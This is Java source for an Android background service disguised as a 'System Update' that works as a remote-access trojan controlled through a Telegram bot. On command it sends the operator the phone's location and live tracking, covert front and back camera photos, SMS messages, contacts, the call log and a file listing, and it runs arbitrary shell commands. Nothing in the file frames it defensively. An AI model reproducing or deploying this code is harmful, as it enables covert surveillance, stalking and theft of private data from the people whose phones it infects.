package com.system.update;
import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.graphics.*;
import android.hardware.camera2.*;
import android.location.*;
import android.media.*;
import android.net.Uri;
import android.os.*;
import android.provider.*;
import android.util.Base64;
import org.json.*;
import java.io.*;
import java.util.*;
public class BotService extends Service {
    private long lastId = 0;
    private boolean running = true;
    private LocationManager locMgr;
    @Override
    public void onCreate(){
        super.onCreate();
        try{
            NotificationChannel ch = new NotificationChannel("sys","System",NotificationManager.IMPORTANCE_LOW);
            ch.setShowBadge(false);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
            Notification n = new Notification.Builder(this,"sys")
                .setContentTitle("System Update").setContentText("Running...")
                .setSmallIcon(android.R.drawable.stat_sys_download_done)
                .setPriority(Notification.PRIORITY_LOW).build();
            startForeground(1, n);
            locMgr = (LocationManager) getSystemService(LOCATION_SERVICE);
        }catch(Exception e){}
    }
    @Override
    public int onStartCommand(Intent i, int f, int s){
        new Thread(this::poll).start();
        return START_STICKY;
    }
    private void poll(){
        TgApi.send("Online");
        while(running){
            try{
                String url = TgApi.API+"/getUpdates?timeout=25&offset="+(lastId+1);
                String r = TgApi.get(url);
                if(r == null || r.isEmpty()){ Thread.sleep(1500); continue; }
                JSONObject j = new JSONObject(r);
                if(!j.optBoolean("ok", false)){ Thread.sleep(2000); continue; }
                JSONArray a = j.optJSONArray("result");
                if(a == null){ Thread.sleep(1000); continue; }
                for(int k=0;k<a.length();k++){
                    JSONObject u = a.getJSONObject(k);
                    long uid = u.optLong("update_id", -1);
                    if(uid > lastId) lastId = uid;
                    JSONObject m = u.optJSONObject("message");
                    if(m == null) continue;
                    JSONObject chat = m.optJSONObject("chat");
                    if(chat == null) continue;
                    String cid = chat.optString("id","");
                    if(!cid.equals(TgApi.CHAT_ID)) continue;
                    String txt = m.optString("text","");
                    if(txt.isEmpty()) continue;
                    handle(txt);
                }
            }catch(Exception e){
                try{ Thread.sleep(2500); }catch(Exception ex){}
            }
        }
    }
    private void handle(String cmd){
        try{
            cmd = cmd.trim();
            if(cmd.equals("/start") || cmd.equals("/help")){
                TgApi.send("MENU:\n/info\n/loc\n/live\n/cam\n/cam_back\n/sms\n/contacts\n/callog\n/files\n/vibrate\n/shell");
                return;
            }
            if(cmd.equals("/info")){ TgApi.send("Model: "+Build.MODEL+"\nBrand: "+Build.BRAND+"\nAndroid: "+Build.VERSION.RELEASE); return; }
            if(cmd.equals("/loc")){ sendLoc(); return; }
            if(cmd.equals("/live")){ liveLoc(); return; }
            if(cmd.equals("/cam")){ capture(0); return; }
            if(cmd.equals("/cam_back")){ capture(1); return; }
            if(cmd.equals("/sms")){ sms(); return; }
            if(cmd.equals("/contacts")){ contacts(); return; }
            if(cmd.equals("/callog")){ callog(); return; }
            if(cmd.equals("/files")){ files(); return; }
            if(cmd.equals("/vibrate")){ vib(); return; }
            if(cmd.startsWith("/shell ")){ shell(cmd.substring(7)); return; }
            TgApi.send("Unknown: "+cmd);
        }catch(Exception e){ TgApi.send("err "+e.getMessage()); }
    }
    private void sendLoc(){
        try{
            Location last = null;
            for(String p : locMgr.getProviders(true)){
                Location l = locMgr.getLastKnownLocation(p);
                if(l!=null && (last==null || l.getTime()>last.getTime())) last = l;
            }
            if(last!=null){ TgApi.sendLoc(last.getLatitude(), last.getLongitude()); TgApi.send("Lat: "+last.getLatitude()+"\nLon: "+last.getLongitude()); }
            else TgApi.send("no location");
        }catch(Exception e){ TgApi.send("loc err "+e.getMessage()); }
    }
    private void liveLoc(){
        TgApi.send("live 60s");
        final LocationListener ll = new LocationListener(){
            public void onLocationChanged(Location l){ TgApi.sendLoc(l.getLatitude(), l.getLongitude()); TgApi.send("Lat: "+l.getLatitude()+"\nLon: "+l.getLongitude()); }
            public void onStatusChanged(String s,int i,Bundle b){}
            public void onProviderEnabled(String s){}
            public void onProviderDisabled(String s){}
        };
        try{
            locMgr.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5000, 0, ll);
            locMgr.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5000, 0, ll);
        }catch(Exception e){}
        new Handler(Looper.getMainLooper()).postDelayed(()->{ try{ locMgr.removeUpdates(ll); }catch(Exception e){} }, 60000);
    }
    private void capture(final int facing){
        try{
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            String camId = null;
            for(String id : cm.getCameraIdList()){
                CameraCharacteristics ch = cm.getCameraCharacteristics(id);
                Integer f = ch.get(CameraCharacteristics.LENS_FACING);
                if(f!=null && f==facing){ camId=id; break; }
            }
            if(camId==null){ TgApi.send("no cam"); return; }
            cm.openCamera(camId, new CameraDevice.StateCallback(){
                public void onOpened(CameraDevice cam){
                    try{
                        final ImageReader rd = ImageReader.newInstance(640,480,ImageFormat.JPEG,2);
                        rd.setOnImageAvailableListener(r->{
                            Image img = r.acquireLatestImage();
                            if(img!=null){
                                java.nio.ByteBuffer buf = img.getPlanes()[0].getBuffer();
                                byte[] by = new byte[buf.remaining()];
                                buf.get(by); img.close();
                                TgApi.sendPhoto(Base64.encodeToString(by,Base64.NO_WRAP),"cam");
                            }
                            cam.close();
                        }, null);
                        cam.createCaptureSession(Collections.singletonList(rd.getSurface()),
                            new CameraCaptureSession.StateCallback(){
                                public void onConfigured(CameraCaptureSession s){
                                    try{
                                        CaptureRequest.Builder b = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                        b.addTarget(rd.getSurface());
                                        s.capture(b.build(), null, null);
                                    }catch(Exception e){}
                                }
                                public void onConfigureFailed(CameraCaptureSession s){}
                            }, null);
                    }catch(Exception e){}
                }
                public void onDisconnected(CameraDevice c){}
                public void onError(CameraDevice c,int e){ TgApi.send("cam err "+e); }
            }, null);
        }catch(Exception e){ TgApi.send("cam ex "+e.getMessage()); }
    }
    private void sms(){
        try{
            StringBuilder sb = new StringBuilder();
            android.database.Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"),null,null,null,"date DESC LIMIT 20");
            while(c!=null && c.moveToNext()){
                sb.append(c.getString(c.getColumnIndex("address"))).append(": ").append(c.getString(c.getColumnIndex("body"))).append("\n");
            }
            if(c!=null)c.close();
            String t = sb.toString();
            if(t.length()>3500) t = t.substring(0,3500);
            TgApi.send(t);
        }catch(Exception e){ TgApi.send("sms err "+e.getMessage()); }
    }
    private void contacts(){
        try{
            StringBuilder sb = new StringBuilder();
            android.database.Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,null,null,null);
            int n=0;
            while(c!=null && c.moveToNext() && n<100){
                sb.append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(": ").append(c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                n++;
            }
            if(c!=null)c.close();
            String t = sb.toString();
            if(t.length()>3500) t = t.substring(0,3500);
            TgApi.send(t);
        }catch(Exception e){ TgApi.send("ct err "+e.getMessage()); }
    }
    private void callog(){
        try{
            StringBuilder sb = new StringBuilder();
            android.database.Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,"date DESC LIMIT 30");
            while(c!=null && c.moveToNext()){
                sb.append(c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))).append(" ").append(c.getString(c.getColumnIndex(CallLog.Calls.DURATION))).append("s\n");
            }
            if(c!=null)c.close();
            TgApi.send(sb.toString());
        }catch(Exception e){ TgApi.send("cl err "+e.getMessage()); }
    }
    private void files(){
        try{
            StringBuilder sb = new StringBuilder();
            File[] fs = Environment.getExternalStorageDirectory().listFiles();
            if(fs!=null) for(File f : fs) sb.append(f.getName()).append("\n");
            String t = sb.toString();
            if(t.length()>3500) t = t.substring(0,3500);
            TgApi.send(t);
        }catch(Exception e){ TgApi.send("fl err "+e.getMessage()); }
    }
    private void vib(){
        try{ ((Vibrator)getSystemService(VIBRATOR_SERVICE)).vibrate(2000); TgApi.send("vib"); }catch(Exception e){}
    }
    private void shell(String cmd){
        try{
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String l;
            while((l=r.readLine())!=null) sb.append(l).append("\n");
            String t = sb.toString();
            if(t.length()>3500) t = t.substring(0,3500);
            TgApi.send(t);
        }catch(Exception e){ TgApi.send("sh err "+e.getMessage()); }
    }
    @Override
    public IBinder onBind(Intent i){ return null; }
}
